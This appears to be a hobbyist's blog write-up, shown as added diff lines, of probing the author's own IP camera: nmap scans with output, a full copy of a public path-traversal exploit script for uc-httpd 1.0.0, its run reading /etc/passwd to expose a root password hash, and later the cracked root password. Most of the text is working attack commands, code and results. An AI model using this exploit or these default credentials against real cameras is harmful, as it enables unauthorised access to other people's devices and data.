@@ -1,0 +1,113 @@
+I’m not 100% sure why the camera initally wouldn’t respond
+to port scanning. I ended up with the below nmap liner after trying it about 6-7 consecutive
+times. Maybe there is some type of built in scan protection. I had to adjust timing. I‘m sure 
+I could timed the timeout or use a nmap -T flag to assist.
+
+root@vulcan:/home/vulcan# nmap -vv -sS -sV -Pn 192.168.1.38
+Yielded…
+PORT STATE SERVICE REASON VERSION
+23/tcp open telnet syn-ack ttl 64 BusyBox telnetd
+80/tcp open http syn-ack ttl 64 uc-httpd 1.0.0
+MAC Address: 44:33:4C:B5:31:CD (Shenzhen Bilian electronic)
+Service Info: Host: IPC365
+
+root@vulcan:/home/vulcan# nmap -vv -sS -sV -Pn -p1-63535 192.168.1.38
+Yielded…
+root@vulcan:/home/vulcan# nmap -vv -sS -sV -Pn -p1-63535 192.168.1.38
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-13 20:00 CDT
+NSE: Loaded 43 scripts for scanning.
+Initiating ARP Ping Scan at 20:00
+Scanning 192.168.1.38 [1 port]
+Completed ARP Ping Scan at 20:00, 0.44s elapsed (1 total hosts)
+Nmap scan report for 192.168.1.38 [host down, received no-response]
+Read data files from: /usr/bin/../share/nmap
+
+Nmap done: 1 IP address (0 hosts up) scanned in 0.85 seconds
+Raw packets sent: 2 (56B) | Rcvd: 0 (0B)
+
+…..um but why? Lets repeat in 2min…
+
+root@vulcan:/home/vulcan# nmap -vv -sS -sV -Pn -p1-63535 192.168.1.38
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-13 20:00 CDT
+NSE: Loaded 43 scripts for scanning.
+Initiating ARP Ping Scan at 20:00
+Scanning 192.168.1.38 [1 port]
+Completed ARP Ping Scan at 20:00, 0.09s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 20:00
+Completed Parallel DNS resolution of 1 host. at 20:00, 0.01s elapsed
+Initiating SYN Stealth Scan at 20:00
+Scanning 192.168.1.38 [63535 ports]
+Discovered open port 23/tcp on 192.168.1.38
+Discovered open port 80/tcp on 192.168.1.38
+Discovered open port 22334/tcp on 192.168.1.38
+Discovered open port 9527/tcp on 192.168.1.38
+Discovered open port 34567/tcp on 192.168.1.38
+Discovered open port 34667/tcp on 192.168.1.38
+
+… hold up…that’s interesting. Now ports found open. That 34k+ port range sure is sketchy.
+Time to break that down
+
+root@vulcan:/home/vulcan# nmap -vv -sT -p80 -Pn 192.168.1.38
+Yielded…
+PORT STATE SERVICE REASON
+80/tcp open http syn-ack
+
+Ok so for sure port 80, http, is open. We need to find out what version though to see 
+what exploits will apply.
+
+vulcan@vulcan:~$ nmap -sV 192.168.1.38
+Gave us…
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-13 20:17 CDT
+Nmap scan report for 192.168.1.38
+Host is up (0.036s latency).
+Not shown: 998 closed ports
+PORT STATE SERVICE VERSION
+23/tcp open telnet BusyBox telnetd
+80/tcp open http uc-httpd 1.0.0 <===== thats pretty old
+
+So good news. We have busybox on 23 and a old and exploitable uc-httpd verision. A Google 
+search for “uc-httpd exploit” gives us this;
+
+https://www.exploit-db.com/exploits/42085/
+————————————————————————————————————-
+”’
+#!/usr/bin/env python
+import urllib2, httplib, sys
+
+httplib.HTTPConnection._http_vsn = 10
+httplib.HTTPConnection._http_vsm_str = ‘HTTP/1.0’
+
+print “[+] uc-httpd 0day exploiter [+]”
+print “[+] usage: python ” + __file__ + ” http://”
+
+host = sys.argv[1]
+fd = raw_input(‘[+] File or Directory: ‘)
+
+print “Exploiting…..”
+print ‘\n’
+print urllib2.urlopen(host + ‘/../../../../..’ + fd).read()
+
+Since the work is done already why not use it.
+
+vulcan@vulcan:~$ python pwn.py http://192.168.1.38
+[+] uc-httpd 0day exploiter [+]
+[+] usage: python pwn.py http://
+[+] File or Directory: /etc/passwd
+breaking bad habbits since 1986
+
+root:$6$msTRRedr$e7Fw3JVflNlRZrIbR1f0qlKLpDnbvd4OuyEJEKBIYs04vylb9IrSKUO4Ldg56tdR1Qk5YPUeV/8PjFLiUFRVM1:0:0::/root:/bin/sh
+
+Now we gotta crack that hash. My hash cracking box just so happens to be my plex server so it can’t do much.
+[It houses a single gtx1050ti sc.]
+
+I can always clean that up but….
+….guess i’lll get back to this when I get back to this. I need my plex server 24/7
+
+Update 05-29-18
+
+
+
+username: root
+password: noty
+
+I no longer use this camera on my network so have closed this project.
